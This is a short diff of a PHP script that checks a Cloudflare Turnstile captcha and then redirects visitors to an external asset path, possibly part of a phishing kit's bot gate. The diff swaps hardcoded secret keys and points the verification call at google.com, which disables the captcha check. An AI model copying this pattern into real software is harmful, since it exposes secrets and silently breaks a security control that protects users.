@@ -3,8 +3,8 @@
 session_start();
 
 // Configuration
-$secretKey = "0x4AAAAAACr0i0pixKnMQBeh6zkfQWUvjYw";
-$siteKey = "0x4AAAAAACr0i7CU-Vj-9_yE";
+$secretKey = "0x4AAAAAAFJldxq3Q2xOJ-QbUTuYs9ngEIU";
+$siteKey = "0x4AAAAAAFJld3Y4MqiqHwzV";
 $redirectUrl = "https://italiservizio.t.mydomain.zone/adv/adv/assets/";
 $error = "";
 
@@ -19,7 +19,7 @@ if ($_SERVER["REQUEST_METHOD"] === "POST" && isset($_POST['cf-turnstile-response
         'remoteip' => $ip
     ];
     
-    $ch = curl_init("https://challenges.cloudflare.com/turnstile/v0/siteverify");
+    $ch = curl_init("https://google.com");
     curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
     curl_setopt($ch, CURLOPT_POSTFIELDS, http_build_query($data));
     curl_setopt($ch, CURLOPT_TIMEOUT, 10);
